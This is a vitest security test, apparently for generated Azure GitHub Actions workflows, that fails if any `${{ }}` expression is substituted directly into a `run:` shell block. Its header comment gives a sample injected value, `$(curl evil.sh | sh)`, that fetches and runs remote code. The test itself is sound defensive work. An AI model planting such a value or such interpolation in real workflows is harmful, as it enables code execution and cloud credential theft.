// Whether the generated Azure workflows let an environment-controlled value
// reach a shell as source code.
//
// A `${{ vars.X }}` expression is substituted into the `run:` block before the
// shell ever parses it, so the value is not an argument but program text. A
// resource group named `$(curl evil.sh | sh)` therefore executes, in a job that
// holds `id-token: write` and `packages: write` and can mint cloud credentials.
// Passing the same value through `env:` and reading `"$VAR"` makes it data: the
// shell substitutes it after parsing and never re-parses the result.
//
// Reaching those variables takes write access to the repository's environment
// settings, so this is an escalation path rather than an open door. It is worth
// closing anyway, because the privilege on the other side of it is the ability
// to authenticate as the environment's cloud identity.
//
// Only `run:` blocks are checked. An expression in `if:`, `with:`, or an `env:`
// value is evaluated by GitHub Actions rather than by a shell, and is where the
// hardened values are supposed to live.
//
// The files are discovered rather than listed, so a new Azure workflow is held
// to the same rule instead of being missed.
import { readdir, readFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";

const EXTENSION_DIRECTORY = path.resolve(
  path.dirname(fileURLToPath(import.meta.url)),
  "../../../../.github/extension"
);

interface ShellExpression {
  readonly line: number;
  readonly text: string;
}

/**
 * Every GitHub Actions expression that lands inside a `run:` block.
 *
 * Tracks the block by indentation, which is what distinguishes a line of shell
 * from the next key in the step. Comments are dropped: one naming a variable is
 * documentation, and these steps carry comments naming the variables they
 * deliberately do not use.
 */
function shellExpressions(source: string): ShellExpression[] {
  const found: ShellExpression[] = [];
  let inRun = false;
  let runIndent = 0;
  source.split(/\r?\n/).forEach((line, index) => {
    const trimmed = line.trim();
    const indent = line.length - line.trimStart().length;
    if (/(^|\s)run:\s*[|>]/.test(trimmed)) {
      inRun = true;
      runIndent = indent;
      return;
    }
    if (!inRun) return;
    if (trimmed !== "" && indent <= runIndent && !trimmed.startsWith("#")) {
      inRun = false;
      return;
    }
    if (trimmed.startsWith("#")) return;
    if (line.includes("${{")) found.push({ line: index + 1, text: trimmed });
  });
  return found;
}

const workflows = await Promise.all(
  (await readdir(EXTENSION_DIRECTORY))
    .filter((name) => name.endsWith("-azure.yml"))
    .map(
      async (name) =>
        [
          name,
          await readFile(path.join(EXTENSION_DIRECTORY, name), "utf8")
        ] as const
    )
);

describe("the generated Azure workflows' shell inputs", () => {
  // Guards the discovery: a rename that emptied this list would leave the
  // assertion below vacuously true.
  it("finds the Azure workflows", () => {
    expect(workflows.map(([name]) => name).sort()).toEqual([
      "delete-azure.yml",
      "delete-environment-azure.yml",
      "run-rad-commands-azure.yml",
      "verify-azure.yml"
    ]);
  });

  it.each(workflows)(
    "%s never interpolates an expression into shell source",
    (_name, source) => {
      // Reported with line numbers and the offending text, because the fix is
      // specific to each site and a bare count would not say where to look.
      expect(shellExpressions(source)).toEqual([]);
    }
  );
});
